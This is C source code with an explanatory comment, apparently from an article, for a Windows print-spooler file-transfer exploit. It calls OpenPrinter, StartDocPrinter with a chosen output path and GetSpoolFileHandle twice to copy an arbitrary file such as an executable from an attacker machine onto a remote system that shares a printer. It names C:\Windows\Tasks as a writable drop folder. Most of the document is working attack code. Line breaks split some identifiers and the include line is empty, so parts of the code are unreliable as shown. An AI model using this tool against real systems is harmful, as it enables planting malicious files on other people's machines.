/*
One of the most important pieces
of the program is the call of the function
StartDocPrinter (which is called
in the program below in the function

writeToPrinter()). It receives a pointer
to a struct of the type DOC _ INFO _ 1. This
struct contains besides other information
the name of the file to which the print job
should be printed (In case you don’t want
to print to a file but to the printer (the usual
case), the parameter pOutputFile is set to
NULL):

typedef struct _DOC_INFO_1 {
 LPTSTR pDocName;
 LPTSTR pOutputFile;
 LPTSTR pDatatype;
} DOC_INFO_1;


The next step is now to obtain a handle
to the output file by using the function
GetSpoolFileHandle, and by using this
handle you can copy arbitrary data to
mytarget.
Only a few peculiarities need to be
considered:

The function GetSpoolFileHandle
does officially exist until Windows
Vista. However, if you use a
statically linked Winspool.lib then
GetSpoolFileHandle works also on
Windows XP.
• The file will be created first on
myattacker. This would be what you
would expect to happen if you choose

Print to file on the system myattacker :
You choose a path and the print job
is stored there. However, if you call
the same function a second time, the
file will be created on the system that
has shared the printer (and on both
systems the file will be created at the
path that has been specified with the
parameter pOutputFile). 


Example code could look like in Listing 7.
It is important that the user account
that you use for remote access to
mytarget and for remote printing on the
shared printer has write access (NTFS)
at the path specified in targetFileName
(see code example above). On a typical
Windows XP SP3, a good candidate for
such a location in the file system would
be the folder C:\Windows\Tasks (Don’t
get it wrong – we cannot create a new
task here, because it is not possible to
add the required entries to the Registry.
The folder is only used to store the file
because of its permissive access rights),
as this folder grants Authenticated Users
write access by default (You will find a
similar path on all Windows systems,
e.g. even on Windows Server 2008, the
path C:\Windows\system32\Tasks
is still writeable for standard user
accounts).


And, as mentioned before, the function writeToPrinter has to be called
twice in the program in order to copy
sourceFileName from myattacker to
targetFileName on mytarget ; otherwise
it will only be created locally on the
myattacker.
One possible explanation for this is
the typical course of a regular print job
that is printed on a shared printer: First, the
print data is spooled on the client system
(as an enhanced metafile – EMF). This
spool file is then sent to the spooler on the
target system, which converts this file to a
different format that is understood by the
printer (rendering). However, both files will
also be created if spooling is turned off (in
the Advanced tab of the printer properties
dialog you can find the setting Print directly
to the printer). A more detailed analysis
seems to be required here for a complete
explanation, which might reveal further
interesting possibilities and functions in the
world of printing





*/

#include <>


/*
spooler.exe -t \\\\target\\Printer1
	    -s file.exe
	    -d remote.exe
*/

LPTSTR sourceFileName;
LPTSTR targetFileName;
LPTSTR target;
int _tmain(int argc, _TCHAR* argv[])
{
 	if(argc != 7) {
 		wprintf_s(_T("\nUsage:\n%s -t target -s localFileNameFullPath -d remoteFileNameFullPath\nExample: %s -t \\\\target\\Printer1 -s C:\\test.exe -d C:\\Windows\\Tasks\\test.exe\n"),argv[0],argv[0]);
 		return 0;
 	}
 for (int i=1;i<argc;i++) {
 if ( (wcslen(argv[i])==2) && (argv[i][0]=='-') ) {
 	switch (argv[i][1]) {
 		case 'd': targetFileNa
			me=argv[i+1]; i=i++; break;
 		case 's': sourceFileNa
			me=argv[i+1]; i=i++; break;
 		case 't':
			target=argv[i+1]; i=i++; break;
 		default: wprintf_s(_T("Unknown parameter: %s\n"),argv[i]);
		return 0;
 		}
 	}
 }
 copyFileToPrintServer(target);
 return 1;
}

int copyFileToPrintServer(LPTSTR pName) {
 PRINTER_DEFAULTS* pDef = new PRINTER_DEFAULTS;
 pDef->pDatatype = NULL; //_T("RAW");
 pDef->pDevMode = NULL;
 HANDLE hPrinter;
 // YOU HAVE TO CALL IT TWICE!!!!! FIRST HANDLE IS
ONLY LOCAL.
 pDef->DesiredAccess = PRINTER_ACCESS_USE;
 // First call...
 if(!OpenPrinter(pName,&hPrinter,pDef)) {
 doFormatMessage(GetLastError());
 return 0;
 }
 writeToPrinter(hPrinter);
 // Second call
 OpenPrinter(pName,&hPrinter,pDef);
 writeToPrinter(hPrinter);
 ClosePrinter(hPrinter);
 return 1;
}


int writeToPrinter(HANDLE hPrinter) {
 DOC_INFO_1* docInfo1 = new DOC_INFO_1;
docInfo1->pDocName = _T("pwn3d");
 docInfo1->pOutputFile = targetFileName;
 docInfo1->pDatatype = NULL;
 if(!StartDocPrinter(hPrinter,1,(LPBYTE)docInfo1)) {
 doFormatMessage(GetLastError());
 return 0;
 }
 HANDLE hFile=GetSpoolFileHandle(hPrinter);
 if(hFile==INVALID_HANDLE_VALUE) {
 doFormatMessage(GetLastError());
 return 0;
 }
 DWORD numb = 0;
 numb = copyFileToHandle(hFile);
 if(INVALID_HANDLE_VALUE == (hFile=CommitSpoolData(hP
rinter,hFile,numb))) {
 doFormatMessage(GetLastError());
 return 0;
 }
 if(!CloseSpoolFileHandle(hPrinter,hFile)) {
 doFormatMessage(GetLastError());
 return 0;
 }
 return 1;
}


DWORD copyFileToHandle(HANDLE hFile) {
 HANDLE readHandle;
 int iFileLength;
 PBYTE pBuffer;
 DWORD dwBytesRead,dwBytesWritten;
 if(INVALID_HANDLE_VALUE==(readHandle=CreateFile(so
urceFileName,GENERIC_READ,FILE_SHARE_
READ,NULL,OPEN_EXISTING,0,NULL)))
 return 0;
 iFileLength = GetFileSize(readHandle,NULL);
 pBuffer = (PBYTE)malloc(iFileLength);
 ReadFile(readHandle,pBuffer,iFileLength,&dwBytesRea
d,NULL);
 CloseHandle(readHandle);
 WriteFile(hFile,pBuffer,iFileLength,&dwBytesWritten
,NULL);
 return dwBytesWritten;
}


void doFormatMessage( unsigned int dwLastErr ) {
 LPVOID lpMsgBuf;
 FormatMessage(
 FORMAT_MESSAGE_ALLOCATE_BUFFER |
 FORMAT_MESSAGE_IGNORE_INSERTS |
 FORMAT_MESSAGE_FROM_SYSTEM,
 NULL,
 dwLastErr,
 MAKELANGID( LANG_NEUTRAL, SUBLANG_DEFAULT ),
 (LPTSTR) &lpMsgBuf,
 0,
 NULL );
 wprintf_s(TEXT("ErrorCode %i: %s"), dwLastErr, lpMsgBuf);
 LocalFree(lpMsgBuf);
}







